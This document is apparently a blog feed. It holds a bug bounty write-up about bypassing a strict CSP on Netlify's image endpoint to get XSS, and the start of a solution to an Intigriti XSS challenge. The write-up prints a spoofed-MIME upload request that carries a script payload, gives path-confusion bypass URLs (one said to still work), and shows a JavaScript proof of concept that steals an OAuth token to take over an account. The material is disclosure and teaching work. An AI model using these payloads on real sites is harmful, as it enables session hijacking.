href="https://app.netlify.com">https://app.netlify.com</a> and how I managed to bypass this CSP Content-Security-Policy: script-src ‘none’ (for those of you who aren’t much familiar with this CSP , in simple terms it means no script execution will be there in any case) along with that some other things which can be applied on other sites also which are using Netlify’s Image CDN , for those of you unfamiliar with what it is would recommend reading this article:</p><p><a href="https://docs.netlify.com/image-cdn/overview/">Netlify Image CDN</a></p><p>In short many popular Static Site Generators have this Image CDN functionality where they optimize the images used on the website. This is useful in cases where you want to make the site load faster by reducing the time taken for loading images as less as possible.</p><p>Some examples of this are:</p><ul><li><a href="https://nextjs.org/docs/pages/building-your-application/optimizing/images">Optimizing: Images | Next.js</a></li><li><a href="https://image.nuxt.com/">Nuxt Image: Optimized Images for your Nuxt Apps</a></li><li><a href="https://www.gatsbyjs.com/docs/preoptimizing-images/">Preoptimizing Your Images | Gatsby</a></li></ul><p>All these have the same goal where they take a url as an input either via a parmeter or from the path and optimize the image. A lot of stuff goes behind the scene when you make a request to such endpoint, if you are interested luckily all of them are open source so you can take a deep dive and maybe find some cool bugs.</p><pre>/_next/image?url=<br>/_gatsby/image/:url<br>/.netlify/image?url=<br>/_ipx/w_200/:url</pre><p>Also you will find these endpoints will often have some checks in place like which url you are allowed to make requests to which is all configurable as per the docs. They aslo validate the Content-Type of the requested image, like image/svg+xml as it could allow xss and other checks to like checking the response buffer too , to make sure the requested image url is really is an image or not before serving the response back.</p><p>Some don’t do any checks for images and even allow you to serve html response via this endpoint, as the requested url is fetched server side not client side it can also be good candidate for SSRF (I am not just bluffing all these some cool hackers have proved all these things are possible) like they were able to bypass the domain check to make request to any url or get xss or even Full read SSRF</p><p>It’s a really interesting attack surface after seeing some awesome research done by Assetnote and Sam Curry in the past on this, I decided to look into them as well , so far have some interesting leads which I hope can be turned into a bug maybe. But well that’s a different topic if I did find something, will make sure to write a blog about it.</p><ul><li><a href="https://samcurry.net/universal-xss-on-netlifys-next-js-library/">Exploiting Web3&#39;s Hidden Attack Surface: Universal XSS on Netlify&#39;s Next.js Library</a></li><li><a href="https://www.assetnote.io/resources/research/exploiting-static-site-generators-when-static-is-not-actually-static">Exploiting Static Site Generators: When Static Is Not Actually Static</a></li></ul><p>Enough background details now back to the finding,so sites built on Netlify has this Image Optimization endpoint</p><pre>/.netlify/images?url=</pre><p>An example url can be this: <a href="https://app.netlify.com//.netlify/images?url=https://app.netlify.com/favicon.ico">https://app.netlify.com/.netlify/images?url=https://app.netlify.com/favicon.ico</a></p><p>There are some more parameters which can also be used to return the image with a different width or height,etc. The url parameter only allows you to fetch files from whitelisted hosts only, this hosts can be configured via the netlify.toml file</p><pre><br>[images]<br>  remote_images = [<br>          &quot;https://my-images.com/.*&quot;, <br>          &quot;https://animals.more-images.com/[bcr]at/.*&quot;]</pre><p>By default the same origin urls are also accepted in the url parameter. You can see in the above config , it makes the use of regex also .*so even little mistakes can have some side effects there.</p><p>As earlier I told some providers don’t do any check on this whether the requested url returns a valid image or not this is in the case of Netlify.</p><p>So you can even do thing like this, here I am requesting the Index page, the response for the requested url is fetched server side (some weird thing can here happen too, maybe ssrf if the config allows making request to any url )</p><figure><img alt="" src="https://cdn-images-1.medium.com/max/1024/1*YBZB8Yv-rD4KsDS5AzvBVw.png" /></figure><p>In case of <a href="https://app.netlify.com">https://app.netlify.com</a> , the following CDN domain was in the whitelist <a href="https://d33wubrfki0l68.cloudfront.net">https://d33wubrfki0l68.cloudfront.net</a>. They use this CDN to host all the user uploaded contents such as profile picture,etc</p><p>I had this thought in my mind, if I could find arbitrary file upload on the CDN domain I could use that here in the /.netlify/image?url endpoint and get XSS ?</p><p>Indeed there was some checks to make sure the user can’t upload anything else but images. I tried SVG but it didn’t allowed it.</p><pre>{&quot;code&quot;:422,&quot;message&quot;:&quot;Logo must be an image&quot;}</pre><p>I found a bypass for this easily , which allowed me to upload any files to the cdn domain.<br>By setting the Content-Type: image/png mimetype for the uploaded file to be one of the whitelisted ones it allowed to bypass the check</p><pre><br>POST /access-control/bb-api/api/v1/accounts/5d77dc9150223b44a44df1f3/logo HTTP/2<br>Host: app.netlify.com<br>Cookie: Redacted<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0<br>Accept: */*<br>Accept-Language: en-US,en;q=0.5<br>Accept-Encoding: gzip, deflate, br<br>Content-Type: multipart/form-data; boundary=---------------------------26024016321888288818835600843<br>Referer: https://app.netlify.com/teams/sudi/overview<br>Content-Length: 606<br>Origin: https://app.netlify.com<br>Sec-Fetch-Dest: empty<br>Sec-Fetch-Mode: cors<br>Sec-Fetch-Site: same-origin<br>Te: trailers<br><br>-----------------------------26024016321888288818835600843<br>Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;xss.html&quot;<br>Content-Type: image/png<br><br>&lt;h1&gt;shirley&lt;/h1&gt;&lt;script&gt;alert()&lt;/script&gt;<br>-----------------------------26024016321888288818835600843--</pre><pre>{<br>  &quot;url&quot;: &quot;https://d33wubrfki0l68.cloudfront.net/5d77dc9150223b44a44df1f3/37319cf93ea440b93ea5/xss.html&quot;<br>}</pre><p>As you can see we recieved a successful response, with url which has the .html extension. Now let’s check the Content-Type of the response ..</p><figure><img alt="" src="https://cdn-images-1.medium.com/max/1000/0*HJQdly5yptzZvM07" /></figure><p>And voilla we now have a working xss in the CDN domain, I thought now it would easy to get xss in the /.netlify/images?url= endpoint</p><p>But we hit a bummer!! Even though the Content-Type is text/html and the response body contains the xss payload it won’t trigger and is pretty useless due to the <strong><em>CSP </em></strong>being used.</p><figure><img alt="" src="https://cdn-images-1.medium.com/max/1000/0*Hq_tR9iBzjXHEWfp" /></figure><pre>Content-Security-Policy: script-src &#39;none&#39;</pre><p>This is the CSP which is being used in this endpoint, as I already mentioned this before it’s impossible to bypass this csp. It’s super strict, leaves no room for any bypasses.</p><p>I lost my hope and was about to give up. But next morning I had a random thought, I have been testing Netlify for a couple of days now so had a good idea about their application and all.</p><p>For other endpoints also they have CSP but it’s very relax , in simple terms that one is easy to bypass but this /.netlify/images?url= endpoint returned a different very strict CSP.</p><p>So on the backend side they must be checking the path of the requested url and serving a different CSP especially for it. Just an example nginx conf of how this might be happening</p><pre>    location /.netlify/images {<br>        # Set Content Security Policy<br>        add_header Content-Security-Policy &quot;script-src &#39;none&#39;&quot;;</pre><p>What if there are any URL parsing confusion b/w the service responsible for serving CSP and the service related to fetching the resource. If this is true can I take advantage of it?</p><p>If I can provide a path such that it doesn’t matches with the location directive so nginx isn’t able to catch that but the backend service normalizes the path and treats it as /.netlify/images only so a proper response is returned which doesn’t have the strict CSP</p><p>I started playing with the path</p><pre>GET /./.netlify/images?url=https://d33wubrfki0l68.cloudfront.net/5d77dc9150223b44a44df1f3/37319cf93ea440b93ea5/xss.html&amp;fit=cover&amp;h=200&amp;w=200&amp;x=x HTTP/2<br>Host: app.netlify.com</pre><p>Response:</p><pre>HTTP/2 200 OK<br><br>Content-Security-Policy: script-src &#39;nonce-ak9jJ87J3kkfSFdbapb1h7sEJ/RjVtSQ&#39; &#39;strict-dynamic&#39; &#39;unsafe-inline&#39; &#39;unsafe-eval&#39; &#39;self&#39; https: http: &#39;none&#39;; report-uri /.netlify/functions/__csp-violations<br>Content-Type: text/html</pre><p>Nice the theory really works, I was able to make it return a different CSP but with the same response. But /./.netlify/images if I use such a path in browser it would normalize the url to /.netlify/images before making the request to the sevrer</p><p>Then I tried some url encoding stuff /.netlify%2fimages and this worked perfectly fine I was able to get <strong>xss</strong></p><figure><img alt="" src="https://cdn-images-1.medium.com/max/1024/0*kXcUxk99-yPy0vvB" /></figure><p>Used a simple poc as this to leak the authorization code from the Github Oauth flow</p><pre>x = window.open(&quot;https://api.netlify.com/auth?provider=github&amp;site_id=app.netlify.com&amp;login=true&amp;redirect=https://app.netlify.com/&quot;);<br><br>setInterval(function() {<br>    console.log(x.location.href);<br>}, 500);</pre><p>I could use this url with the access_tokento login to victim’s account as the access_token in the query param is basically their main session cookie.</p><figure><img alt="" src="https://cdn-images-1.medium.com/max/1024/0*6oJjIZ_sMGYgNYHU" /></figure><p>They tried fixing it but soon enough I found another bypass, by just adding a / before the path I was able to bypass the CSP:</p><pre>//.netlify/images</pre><p>This bypass still works you can try playing with the endpoint here</p><p><a href="https://app.netlify.com//.netlify/images?url=https://d33wubrfki0l68.cloudfront.net/5d77dc9150223b44a44df1f3/ce5815cfceaaea304025/xss.html&amp;fit=cover&amp;h=200&amp;w=200&amp;x=x">https://app.netlify.com//.netlify/images?url=https://d33wubrfki0l68.cloudfront.net/5d77dc9150223b44a44df1f3/ce5815cfceaaea304025/xss.html&amp;fit=cover&amp;h=200&amp;w=200&amp;x=x</a></p><p>The url is pointing to an old uploaded html file, Netlify fixed the issue by disallowing the upload of arbitrary files on their CDN Domain and left the url parser bug as it is. As you no longer have a way to upload arbitrary file which can lead to xss they consider this issue to be fixed ¯\_(ツ)_/¯</p><p>I hope you liked the writeup, next time you had to deal with a strict csp maybe try playing with the path and see if you can make the server return a relaxed csp or something which might be easier to bypass than the original one and you can get lucky like me :)</p><img src="https://medium.com/_/stat?event=post.clientViewed&referrerSource=full_rss&postId=755a27065fd9" width="1" height="1" alt=""><hr><p><a href="https://infosecwriteups.com/bypassing-csp-via-url-parser-confusions-xss-on-netlifys-image-cdn-755a27065fd9">Bypassing CSP via URL Parser Confusions : XSS on Netlify’s Image CDN</a> was originally published in <a href="https://infosecwriteups.com">InfoSec Write-ups</a> on Medium, where people are continuing the conversation by highlighting and responding to this story.</p>]]></content><author><name>GitHub User</name><email>your-email@domain.com</email></author><category term="bug-bounty" /><category term="csp" /><category term="xss-attack" /><summary type="html"><![CDATA[Bypassing CSP via URL Parser Confusions : XSS on Netlify’s Image CDNHeyyy Everyonee,In this blogpost I am going to talk about my finding which was a XSS on Netlify’s Image CDN used in https://app.netlify.com and how I managed to bypass this CSP Content-Security-Policy: script-src ‘none’ (for those of you who aren’t much familiar with this CSP , in simple terms it means no script execution will be there in any case) along with that some other things which can be applied on other sites also which are using Netlify’s Image CDN , for those of you unfamiliar with what it is would recommend reading this article:Netlify Image CDNIn short many popular Static Site Generators have this Image CDN functionality where they optimize the images used on the website. This is useful in cases where you want to make the site load faster by reducing the time taken for loading images as less as possible.Some examples of this are:Optimizing: Images | Next.jsNuxt Image: Optimized Images for your Nuxt AppsPreoptimizing Your Images | GatsbyAll these have the same goal where they take a url as an input either via a parmeter or from the path and optimize the image. A lot of stuff goes behind the scene when you make a request to such endpoint, if you are interested luckily all of them are open source so you can take a deep dive and maybe find some cool bugs./_next/image?url=/_gatsby/image/:url/.netlify/image?url=/_ipx/w_200/:urlAlso you will find these endpoints will often have some checks in place like which url you are allowed to make requests to which is all configurable as per the docs. They aslo validate the Content-Type of the requested image, like image/svg+xml as it could allow xss and other checks to like checking the response buffer too , to make sure the requested image url is really is an image or not before serving the response back.Some don’t do any checks for images and even allow you to serve html response via this endpoint, as the requested url is fetched server side not client side it can also be good candidate for SSRF (I am not just bluffing all these some cool hackers have proved all these things are possible) like they were able to bypass the domain check to make request to any url or get xss or even Full read SSRFIt’s a really interesting attack surface after seeing some awesome research done by Assetnote and Sam Curry in the past on this, I decided to look into them as well , so far have some interesting leads which I hope can be turned into a bug maybe. But well that’s a different topic if I did find something, will make sure to write a blog about it.Exploiting Web3&#39;s Hidden Attack Surface: Universal XSS on Netlify&#39;s Next.js LibraryExploiting Static Site Generators: When Static Is Not Actually StaticEnough background details now back to the finding,so sites built on Netlify has this Image Optimization endpoint/.netlify/images?url=An example url can be this: https://app.netlify.com/.netlify/images?url=https://app.netlify.com/favicon.icoThere are some more parameters which can also be used to return the image with a different width or height,etc. The url parameter only allows you to fetch files from whitelisted hosts only, this hosts can be configured via the netlify.toml file[images] remote_images = [ &quot;https://my-images.com/.*&quot;, &quot;https://animals.more-images.com/[bcr]at/.*&quot;]By default the same origin urls are also accepted in the url parameter. You can see in the above config , it makes the use of regex also .*so even little mistakes can have some side effects there.As earlier I told some providers don’t do any check on this whether the requested url returns a valid image or not this is in the case of Netlify.So you can even do thing like this, here I am requesting the Index page, the response for the requested url is fetched server side (some weird thing can here happen too, maybe ssrf if the config allows making request to any url )In case of https://app.netlify.com , the following CDN domain was in the whitelist https://d33wubrfki0l68.cloudfront.net. They use this CDN to host all the user uploaded contents such as profile picture,etcI had this thought in my mind, if I could find arbitrary file upload on the CDN domain I could use that here in the /.netlify/image?url endpoint and get XSS ?Indeed there was some checks to make sure the user can’t upload anything else but images. I tried SVG but it didn’t allowed it.{&quot;code&quot;:422,&quot;message&quot;:&quot;Logo must be an image&quot;}I found a bypass for this easily , which allowed me to upload any files to the cdn domain.By setting the Content-Type: image/png mimetype for the uploaded file to be one of the whitelisted ones it allowed to bypass the checkPOST /access-control/bb-api/api/v1/accounts/5d77dc9150223b44a44df1f3/logo HTTP/2Host: app.netlify.comCookie: RedactedUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0Accept: */*Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflate, brContent-Type: multipart/form-data; boundary=---------------------------26024016321888288818835600843Referer: https://app.netlify.com/teams/sudi/overviewContent-Length: 606Origin: https://app.netlify.comSec-Fetch-Dest: emptySec-Fetch-Mode: corsSec-Fetch-Site: same-originTe: trailers-----------------------------26024016321888288818835600843Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;xss.html&quot;Content-Type: image/png&lt;h1&gt;shirley&lt;/h1&gt;&lt;script&gt;alert()&lt;/script&gt;-----------------------------26024016321888288818835600843--{ &quot;url&quot;: &quot;https://d33wubrfki0l68.cloudfront.net/5d77dc9150223b44a44df1f3/37319cf93ea440b93ea5/xss.html&quot;}As you can see we recieved a successful response, with url which has the .html extension. Now let’s check the Content-Type of the response ..And voilla we now have a working xss in the CDN domain, I thought now it would easy to get xss in the /.netlify/images?url= endpointBut we hit a bummer!! Even though the Content-Type is text/html and the response body contains the xss payload it won’t trigger and is pretty useless due to the CSP being used.Content-Security-Policy: script-src &#39;none&#39;This is the CSP which is being used in this endpoint, as I already mentioned this before it’s impossible to bypass this csp. It’s super strict, leaves no room for any bypasses.I lost my hope and was about to give up. But next morning I had a random thought, I have been testing Netlify for a couple of days now so had a good idea about their application and all.For other endpoints also they have CSP but it’s very relax , in simple terms that one is easy to bypass but this /.netlify/images?url= endpoint returned a different very strict CSP.So on the backend side they must be checking the path of the requested url and serving a different CSP especially for it. Just an example nginx conf of how this might be happening location /.netlify/images { # Set Content Security Policy add_header Content-Security-Policy &quot;script-src &#39;none&#39;&quot;;What if there are any URL parsing confusion b/w the service responsible for serving CSP and the service related to fetching the resource. If this is true can I take advantage of it?If I can provide a path such that it doesn’t matches with the location directive so nginx isn’t able to catch that but the backend service normalizes the path and treats it as /.netlify/images only so a proper response is returned which doesn’t have the strict CSPI started playing with the pathGET /./.netlify/images?url=https://d33wubrfki0l68.cloudfront.net/5d77dc9150223b44a44df1f3/37319cf93ea440b93ea5/xss.html&amp;fit=cover&amp;h=200&amp;w=200&amp;x=x HTTP/2Host: app.netlify.comResponse:HTTP/2 200 OKContent-Security-Policy: script-src &#39;nonce-ak9jJ87J3kkfSFdbapb1h7sEJ/RjVtSQ&#39; &#39;strict-dynamic&#39; &#39;unsafe-inline&#39; &#39;unsafe-eval&#39; &#39;self&#39; https: http: &#39;none&#39;; report-uri /.netlify/functions/__csp-violationsContent-Type: text/htmlNice the theory really works, I was able to make it return a different CSP but with the same response. But /./.netlify/images if I use such a path in browser it would normalize the url to /.netlify/images before making the request to the sevrerThen I tried some url encoding stuff /.netlify%2fimages and this worked perfectly fine I was able to get xssUsed a simple poc as this to leak the authorization code from the Github Oauth flowx = window.open(&quot;https://api.netlify.com/auth?provider=github&amp;site_id=app.netlify.com&amp;login=true&amp;redirect=https://app.netlify.com/&quot;);setInterval(function() { console.log(x.location.href);}, 500);I could use this url with the access_tokento login to victim’s account as the access_token in the query param is basically their main session cookie.They tried fixing it but soon enough I found another bypass, by just adding a / before the path I was able to bypass the CSP://.netlify/imagesThis bypass still works you can try playing with the endpoint herehttps://app.netlify.com//.netlify/images?url=https://d33wubrfki0l68.cloudfront.net/5d77dc9150223b44a44df1f3/ce5815cfceaaea304025/xss.html&amp;fit=cover&amp;h=200&amp;w=200&amp;x=xThe url is pointing to an old uploaded html file, Netlify fixed the issue by disallowing the upload of arbitrary files on their CDN Domain and left the url parser bug as it is. As you no longer have a way to upload arbitrary file which can lead to xss they consider this issue to be fixed ¯\_(ツ)_/¯I hope you liked the writeup, next time you had to deal with a strict csp maybe try playing with the path and see if you can make the server return a relaxed csp or something which might be easier to bypass than the original one and you can get lucky like me :)Bypassing CSP via URL Parser Confusions : XSS on Netlify’s Image CDN was originally published in InfoSec Write-ups on Medium, where people are continuing the conversation by highlighting and responding to this story.]]></summary></entry><entry><title type="html">Intigriti Xss Challenge Jan 2024 Solution</title><link href="http://localhost:4000/2024/01/17/Intigriti-XSS-Challenge-Jan-2024-Solution.html" rel="alternate" type="text/html" title="Intigriti Xss Challenge Jan 2024 Solution" /><published>2024-01-17T00:00:00+00:00</published><updated>2024-01-17T00:00:00+00:00</updated><id>http://localhost:4000/2024/01/17/Intigriti-XSS-Challenge-Jan-2024-Solution</id><content type="html" xml:base="http://localhost:4000/2024/01/17/Intigriti-XSS-Challenge-Jan-2024-Solution.html"><![CDATA[<p>Mizu put another great xss challenge at the start of this year, so I went all in to solve it this time finally :p</p>

<p>The source for this challenge was provided: https://challenge-0124.intigriti.io/static/source.zip</p>

<p>The routes are defined in \src\app.js</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">app</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="dl">"</span><span class="s2">/</span><span class="dl">"</span><span class="p">,</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
    <span class="k">if </span><span class="p">(</span><span class="o">!</span><span class="nx">req</span><span class="p">.</span><span class="nx">query</span><span class="p">.</span><span class="nx">name</span><span class="p">)</span> <span class="p">{</span>
        <span class="nx">res</span><span class="p">.</span><span class="nf">render</span><span class="p">(</span><span class="dl">"</span><span class="s2">index</span><span class="dl">"</span><span class="p">);</span>
	<span class="k">return</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="nx">res</span><span class="p">.</span><span class="nf">render</span><span class="p">(</span><span class="dl">"</span><span class="s2">search</span><span class="dl">"</span><span class="p">,</span> <span class="p">{</span>
        <span class="na">name</span><span class="p">:</span> <span class="nx">DOMPurify</span><span class="p">.</span><span class="nf">sanitize</span><span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">query</span><span class="p">.</span><span class="nx">name</span><span class="p">,</span> <span class="p">{</span> <span class="na">SANITIZE_DOM</span><span class="p">:</span> <span class="kc">false</span> <span class="p">}),</span>
        <span class="na">search</span><span class="p">:</span> <span class="nx">req</span><span class="p">.</span><span class="nx">query</span><span class="p">.</span><span class="nx">search</span>
    <span class="p">});</span>
<span class="p">});</span>

<span class="nx">app</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span><span class="dl">"</span><span class="s2">/search</span><span class="dl">"</span><span class="p">,</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
    <span class="nx">name</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">q</span><span class="p">;</span>
    <span class="nx">repo</span> <span class="o">=</span> <span class="p">{};</span>

    <span class="k">for </span><span class="p">(</span><span class="kd">let</span> <span class="nx">item</span> <span class="k">of</span> <span class="nx">repos</span><span class="p">.</span><span class="nx">items</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">if </span><span class="p">(</span><span class="nx">item</span><span class="p">.</span><span class="nx">full_name</span> <span class="o">&amp;&amp;</span> <span class="nx">item</span><span class="p">.</span><span class="nx">full_name</span><span class="p">.</span><span class="nf">includes</span><span class="p">(</span><span class="nx">name</span><span class="p">))</span> <span class="p">{</span>
            <span class="nx">repo</span> <span class="o">=</span> <span class="nx">item</span>
	    <span class="k">break</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span>
    <span class="nx">res</span><span class="p">.</span><span class="nf">json</span><span class="p">(</span><span class="nx">repo</span><span class="p">);</span>
<span class="p">});</span>
</code></pre></div></div>

<p>The two relevant onces are this.</p>

<p>For the first index root, it takes the value from the query parameters <code class="language-plaintext highlighter-rouge">name</code> and <code class="language-plaintext highlighter-rouge">search</code> which are passed to the render method. Sanitization is being done on name parameter via dompurify so no easy xss there.</p>

<p>Those parameters values are used in the search.ejs template</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&lt;%-</span> <span class="nf">include</span><span class="p">(</span><span class="dl">"</span><span class="s2">inc/header</span><span class="dl">"</span><span class="p">);</span> <span class="o">%&gt;</span>
<span class="o">&lt;</span><span class="nx">h2</span><span class="o">&gt;</span><span class="nx">Hey</span> <span class="o">&lt;%-</span> <span class="nx">name</span> <span class="o">%&gt;</span><span class="p">,</span><span class="o">&lt;</span><span class="nx">br</span><span class="o">&gt;</span><span class="nx">Which</span> <span class="nx">repo</span> <span class="nx">are</span> <span class="nx">you</span> <span class="nx">looking</span> <span class="k">for</span><span class="p">?</span><span class="o">&lt;</span><span class="sr">/h2</span><span class="err">&gt;
</span>
<span class="o">&lt;</span><span class="nx">form</span> <span class="nx">id</span><span class="o">=</span><span class="dl">"</span><span class="s2">search</span><span class="dl">"</span><span class="o">&gt;</span>
    <span class="o">&lt;</span><span class="nx">input</span> <span class="nx">name</span><span class="o">=</span><span class="dl">"</span><span class="s2">q</span><span class="dl">"</span> <span class="nx">value</span><span class="o">=</span><span class="dl">"</span><span class="s2">&lt;%= search %&gt;</span><span class="dl">"</span><span class="o">&gt;</span>
<span class="o">&lt;</span><span class="sr">/form</span><span class="err">&gt;
</span>
<span class="o">&lt;</span><span class="nx">hr</span><span class="o">&gt;</span>

<span class="o">&lt;</span><span class="nx">img</span> <span class="nx">src</span><span class="o">=</span><span class="dl">"</span><span class="s2">/static/img/loading.gif</span><span class="dl">"</span> <span class="kd">class</span><span class="o">=</span><span class="dl">"</span><span class="s2">loading</span><span class="dl">"</span> <span class="nx">width</span><span class="o">=</span><span class="dl">"</span><span class="s2">50px</span><span class="dl">"</span> <span class="nx">hidden</span><span class="o">&gt;&lt;</span><span class="nx">br</span><span class="o">&gt;</span>
<span class="o">&lt;</span><span class="nx">img</span> <span class="kd">class</span><span class="o">=</span><span class="dl">"</span><span class="s2">avatar</span><span class="dl">"</span> <span class="nx">width</span><span class="o">=</span><span class="dl">"</span><span class="s2">35%</span><span class="dl">"</span><span class="o">&gt;</span>
<span class="o">&lt;</span><span class="nx">p</span> <span class="nx">id</span><span class="o">=</span><span class="dl">"</span><span class="s2">description</span><span class="dl">"</span><span class="o">&gt;&lt;</span><span class="sr">/p</span><span class="err">&gt;
</span><span class="o">&lt;</span><span class="nx">iframe</span> <span class="nx">id</span><span class="o">=</span><span class="dl">"</span><span class="s2">homepage</span><span class="dl">"</span> <span class="nx">hidden</span><span class="o">&gt;&lt;</span><span class="sr">/iframe</span><span class="err">&gt;
</span>
<span class="o">&lt;</span><span class="nx">script</span> <span class="nx">src</span><span class="o">=</span><span class="dl">"</span><span class="s2">/static/js/axios.min.js</span><span class="dl">"</span><span class="o">&gt;&lt;</span><span class="sr">/script</span><span class="err">&gt;
</span><span class="o">&lt;</span><span class="nx">script</span> <span class="nx">src</span><span class="o">=</span><span class="dl">"</span><span class="s2">/static/js/jquery-3.7.1.min.js</span><span class="dl">"</span><span class="o">&gt;&lt;</span><span class="sr">/script</span><span class="err">&gt;
</span><span class="o">&lt;</span><span class="nx">script</span><span class="o">&gt;</span>
    <span class="kd">function</span> <span class="nf">search</span><span class="p">(</span><span class="nx">name</span><span class="p">)</span> <span class="p">{</span>
        <span class="nf">$</span><span class="p">(</span><span class="dl">"</span><span class="s2">img.loading</span><span class="dl">"</span><span class="p">).</span><span class="nf">attr</span><span class="p">(</span><span class="dl">"</span><span class="s2">hidden</span><span class="dl">"</span><span class="p">,</span> <span class="kc">false</span><span class="p">);</span>

        <span class="nx">axios</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span><span class="dl">"</span><span class="s2">/search</span><span class="dl">"</span><span class="p">,</span> <span class="nf">$</span><span class="p">(</span><span class="dl">"</span><span class="s2">#search</span><span class="dl">"</span><span class="p">).</span><span class="nf">get</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span> <span class="p">{</span>
            <span class="dl">"</span><span class="s2">headers</span><span class="dl">"</span><span class="p">:</span> <span class="p">{</span> <span class="dl">"</span><span class="s2">Content-Type</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">application/json</span><span class="dl">"</span> <span class="p">}</span>
        <span class="p">}).</span><span class="nf">then</span><span class="p">((</span><span class="nx">d</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
            <span class="nf">$</span><span class="p">(</span><span class="dl">"</span><span class="s2">img.loading</span><span class="dl">"</span><span class="p">).</span><span class="nf">attr</span><span class="p">(</span><span class="dl">"</span><span class="s2">hidden</span><span class="dl">"</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
            <span class="kd">const</span> <span class="nx">repo</span> <span class="o">=</span> <span class="nx">d</span><span class="p">.</span><span class="nx">data</span><span class="p">;</span>
            <span class="k">if </span><span class="p">(</span><span class="o">!</span><span class="nx">repo</span><span class="p">.</span><span class="nx">owner</span><span class="p">)</span> <span class="p">{</span>
                <span class="nf">alert</span><span class="p">(</span><span class="dl">"</span><span class="s2">Not found!</span><span class="dl">"</span><span class="p">);</span>
                <span class="k">return</span><span class="p">;</span>
            <span class="p">};</span>

            <span class="nf">$</span><span class="p">(</span><span class="dl">"</span><span class="s2">img.avatar</span><span class="dl">"</span><span class="p">).</span><span class="nf">attr</span><span class="p">(</span><span class="dl">"</span><span class="s2">src</span><span class="dl">"</span><span class="p">,</span> <span class="nx">repo</span><span class="p">.</span><span class="nx">owner</span><span class="p">.</span><span class="nx">avatar_url</span><span class="p">);</span>
            <span class="nf">$</span><span class="p">(</span><span class="dl">"</span><span class="s2">#description</span><span class="dl">"</span><span class="p">).</span><span class="nf">text</span><span class="p">(</span><span class="nx">repo</span><span class="p">.</span><span class="nx">description</span><span class="p">);</span>
            <span class="k">if </span><span class="p">(</span><span class="nx">repo</span><span class="p">.</span><span class="nx">homepage</span> <span class="o">&amp;&amp;</span> <span class="nx">repo</span><span class="p">.</span><span class="nx">homepage</span><span class="p">.</span><span class="nf">startsWith</span><span class="p">(</span><span class="dl">"</span><span class="s2">https://</span><span class="dl">"</span><span class="p">))</span> <span class="p">{</span>
                <span class="nf">$</span><span class="p">(</span><span class="dl">"</span><span class="s2">#homepage</span><span class="dl">"</span><span class="p">).</span><span class="nf">attr</span><span class="p">({</span>
                    <span class="dl">"</span><span class="s2">src</span><span class="dl">"</span><span class="p">:</span> <span class="nx">repo</span><span class="p">.</span><span class="nx">homepage</span><span class="p">,</span>
                    <span class="dl">"</span><span class="s2">hidden</span><span class="dl">"</span><span class="p">:</span> <span class="kc">false</span>
                <span class="p">});</span>
            <span class="p">};</span>
        <span class="p">});</span>
    <span class="p">};</span>

    <span class="nb">window</span><span class="p">.</span><span class="nx">onload</span> <span class="o">=</span> <span class="p">()</span> <span class="o">=&gt;</span> <span class="p">{</span>
        <span class="kd">const</span> <span class="nx">params</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">URLSearchParams</span><span class="p">(</span><span class="nx">location</span><span class="p">.</span><span class="nx">search</span><span class="p">);</span>
        <span class="k">if </span><span class="p">(</span><span class="nx">params</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="dl">"</span><span class="s2">search</span><span class="dl">"</span><span class="p">))</span> <span class="nf">search</span><span class="p">();</span>

        <span class="nf">$</span><span class="p">(</span><span class="dl">"</span><span class="s2">#search</span><span class="dl">"</span><span class="p">).</span><span class="nf">submit</span><span class="p">((</span><span class="nx">e</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
            <span class="nx">e</span><span class="p">.</span><span class="nf">preventDefault</span><span class="p">();</span>
            <span class="nf">search</span><span class="p">();</span>
        <span class="p">});</span>
    <span class="p">};</span>
<span class="o">&lt;</span><span class="sr">/script</span><span class="err">&gt;
</span><span class="o">&lt;</span><span class="sr">/body</span><span class="err">&gt;
</span><span class="o">&lt;</span><span class="sr">/html</span><span class="err">&gt;
</span>
</code></pre></div></div>

<p>The value from <code class="language-plaintext highlighter-rouge">name</code> parameter (sanitized using dompurify) is placed here:</p>

<pre><code class="language-ejs">&lt;h2&gt;Hey &lt;%- name %&gt;,&lt;br&gt;Which repo are you looking for?&lt;/h2&gt;
</code></pre>

<p>From ejs docs https://ejs.co/#docs
<code class="language-plaintext highlighter-rouge">&lt;%-</code> Outputs the unescaped value into the template, so this is clearly a html injection bug (no xss due to use of dompurify)</p>

<pre><code class="language-ejs">&lt;input name="q" value="&lt;%= search %&gt;"&gt;
</code></pre>
<p><code class="language-plaintext highlighter-rouge">search</code> parameter value is safe from html injection: <code class="language-plaintext highlighter-rouge">&lt;%=</code> Outputs the value into the template (HTML escaped)</p>

<p>The same can be verified from this url: https://challenge-0124.intigriti.io/challenge?name=shirley%3Cimg%20src=x%3E&amp;search=shirley%22%3E%3Cimg%20src=x%3E
<img src="https://github.com/Sudistark/CTF-Writeups/assets/31372554/60261d43-9364-4fa4-9b4c-ca12f575b20d" alt="image" /></p>

